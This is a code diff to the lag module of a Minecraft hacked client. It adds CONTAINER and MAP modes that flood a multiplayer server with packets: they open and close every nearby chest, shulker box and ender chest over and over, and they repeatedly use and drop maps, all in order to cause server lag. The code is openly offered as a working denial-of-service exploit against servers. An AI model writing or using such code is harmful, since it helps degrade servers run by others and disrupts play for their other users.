@@ -1,19 +1,24 @@
 package me.rigamortis.seppuku.impl.module.misc;
 
 import me.rigamortis.seppuku.api.event.EventStageable;
+import me.rigamortis.seppuku.api.event.minecraft.EventDisplayGui;
 import me.rigamortis.seppuku.api.event.player.EventPlayerUpdate;
 import me.rigamortis.seppuku.api.module.Module;
 import me.rigamortis.seppuku.api.value.Value;
 import net.minecraft.client.Minecraft;
+import net.minecraft.client.gui.inventory.GuiContainer;
+import net.minecraft.client.gui.inventory.GuiInventory;
 import net.minecraft.entity.Entity;
 import net.minecraft.init.Items;
+import net.minecraft.inventory.ClickType;
+import net.minecraft.inventory.Container;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.nbt.NBTTagString;
 import net.minecraft.network.play.client.*;
-import net.minecraft.tileentity.TileEntity;
-import net.minecraft.tileentity.TileEntitySign;
+import net.minecraft.tileentity.*;
+import net.minecraft.util.EnumFacing;
 import net.minecraft.util.EnumHand;
 import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.text.TextComponentString;
@@ -28,12 +33,12 @@ public final class LaggerModule extends Module {
     public final Value<Mode> mode = new Value<Mode>("Mode", new String[]{"Mode", "M"}, "Change between various lagger modes, each utilizing a different exploit to cause lag.", Mode.BOXER);
 
     private enum Mode {
-        BOXER, SWAP, MOVEMENT, SIGN, NBT
+        BOXER, SWAP, MOVEMENT, SIGN, NBT, CONTAINER, MAP
     }
 
     public final Value<Integer> packets = new Value<Integer>("Packets", new String[]{"pckts", "packet"}, "Amount of packets to send each tick while running the chosen lag mode.", 500, 0, 5000, 1);
 
-    final Minecraft mc = Minecraft.getMinecraft();
+    private Container lastContainer = null;
 
     public LaggerModule() {
         super("Lagger", new String[]{"Lag"}, "Spams unoptimized packets", "NONE", -1, ModuleType.MISC);
@@ -47,6 +52,10 @@ public final class LaggerModule extends Module {
     @Listener
     public void onUpdate(EventPlayerUpdate event) {
         if (event.getStage() == EventStageable.EventStage.PRE) {
+            final Minecraft mc = Minecraft.getMinecraft();
+            if (mc.player == null || mc.world == null)
+                return;
+
             switch (this.mode.getValue()) {
                 case BOXER:
                     for (int i = 0; i <= this.packets.getValue(); i++) {
@@ -99,8 +108,44 @@ public final class LaggerModule extends Module {
                         //mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
                     }
                     break;
+                case CONTAINER:
+                    for (TileEntity tileEntity : mc.world.loadedTileEntityList) {
+                        if (tileEntity instanceof TileEntityChest || tileEntity instanceof TileEntityShulkerBox || tileEntity instanceof TileEntityEnderChest) {
+                            if (mc.player.openContainer != this.lastContainer) {
+                                mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(tileEntity.getPos(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0, 0, 0));
+                                mc.player.connection.sendPacket(new CPacketCloseWindow());
+                            }
+                        }
+                    }
+                    break;
+                case MAP:
+                    /* made by @sn0wy01 */
+                    mc.player.connection.sendPacket(new CPacketHeldItemChange(1));
+                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.player.getPosition().down(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
+                    mc.player.connection.sendPacket(new CPacketHeldItemChange(0));
+                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));
+
+                    for (int i = 0; i <= 44; ++i) {
+                        if (mc.player.inventoryContainer.getSlot(i).getStack().getItem() == Items.FILLED_MAP) {
+                            mc.playerController.windowClick(mc.player.openContainer.windowId, i, 0, ClickType.THROW, mc.player);
+                            mc.player.inventory.removeStackFromSlot(i);
+                        }
+                    }
+                    break;
             }
         }
     }
 
+    @Listener
+    public void onDisplayGui(EventDisplayGui event) {
+        if (event.getScreen() != null) {
+            if (this.mode.getValue().equals(Mode.CONTAINER)) {
+                if (!(event.getScreen() instanceof GuiInventory) && event.getScreen() instanceof GuiContainer) {
+                    GuiContainer guiContainer = (GuiContainer) event.getScreen();
+                    this.lastContainer = guiContainer.inventorySlots;
+                    event.setCanceled(true);
+                }
+            }
+        }
+    }
 }
